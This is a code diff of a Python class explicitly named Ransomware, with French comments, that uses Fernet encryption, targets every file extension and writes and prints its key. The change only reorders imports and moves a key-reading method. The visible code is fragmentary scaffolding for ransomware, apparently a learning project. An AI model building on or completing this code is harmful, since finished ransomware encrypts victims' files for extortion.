@@ -2,9 +2,11 @@ import os
 from os.path import expanduser
 from cryptography.fernet import Fernet
 import base64
-import http.server
-import requests
 import threading
+import requests
+import http.server
+
+
 
 """     A LIRE """
 """
@@ -39,11 +41,6 @@ class Ransomware:
         self.file_ext_targets = ["*"]
 
 
-    def read_key(self, key):
-        """
-        Lis la clé dans le fichier keyfile_name
-        """
-        self.cryptor = Fernet(key)
 
 
     def write_key(self, keyfile_name):
@@ -53,7 +50,13 @@ class Ransomware:
         print(self.key)
         with open(keyfile_name, 'wb') as f:
             f.write(self.key)
-    
+
+    def read_key(self, key):
+        """
+        Lis la clé dans le fichier keyfile_name
+        """
+        self.cryptor = Fernet(key)
+
 
     def crypt_tmp(self, tmp_dir, encrypted=False):
         """
